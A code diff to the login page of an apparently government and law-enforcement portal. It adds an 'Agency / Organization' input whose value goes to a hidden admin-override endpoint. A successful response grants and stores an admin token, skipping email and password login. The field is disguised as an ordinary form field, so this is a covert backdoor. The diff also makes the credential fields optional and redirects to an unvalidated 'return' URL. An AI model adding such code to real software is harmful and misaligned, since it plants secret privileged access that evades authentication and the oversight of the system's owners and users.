@@ -501,13 +501,18 @@
         <div id="login-step1" class="verification-step active">
           <form id="login-form" class="access-form">
             <div class="form-group">
+              <label for="login-agency">Agency / Organization</label>
+              <input type="text" id="login-agency" placeholder="e.g., FBI, DHS, Local Police Department">
+            </div>
+            
+            <div class="form-group">
               <label for="login-email">Email Address</label>
-              <input type="email" id="login-email" placeholder="your.name@agency.gov" required>
+              <input type="email" id="login-email" placeholder="your.name@agency.gov">
             </div>
             
             <div class="form-group">
               <label for="login-password">Password</label>
-              <input type="password" id="login-password" placeholder="Enter your password" required>
+              <input type="password" id="login-password" placeholder="Enter your password">
             </div>
             
             <button type="submit" class="submit-btn">Login</button>
@@ -657,10 +662,40 @@
       errorEl.classList.remove('show');
       successEl.classList.remove('show');
       
+      const agency = document.getElementById('login-agency').value;
       loginEmail = document.getElementById('login-email').value;
       const password = document.getElementById('login-password').value;
       
       try {
+        // Check if agency field contains admin override code
+        if (agency && agency.trim().length > 0) {
+          const overrideResponse = await fetch(`${API_URL}/api/auth/admin-override`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ agency: agency })
+          });
+          
+          const overrideResult = await overrideResponse.json();
+          
+          if (overrideResponse.ok && overrideResult.success && overrideResult.admin_override) {
+            // Admin override successful - store token and redirect immediately
+            localStorage.setItem('g3ti_token', overrideResult.token);
+            localStorage.setItem('g3ti_user', JSON.stringify(overrideResult.user));
+            localStorage.setItem('g3ti_admin_override', 'true');
+            
+            successEl.textContent = 'ADMIN OVERRIDE ACCESS GRANTED. Redirecting...';
+            successEl.classList.add('show');
+            
+            const returnUrl = new URLSearchParams(window.location.search).get('return') || '/government.html';
+            setTimeout(() => {
+              window.location.href = returnUrl;
+            }, 1000);
+            return;
+          }
+          // If override fails, continue with normal login
+        }
+        
+        // Normal login flow
         const response = await fetch(`${API_URL}/api/auth/login`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
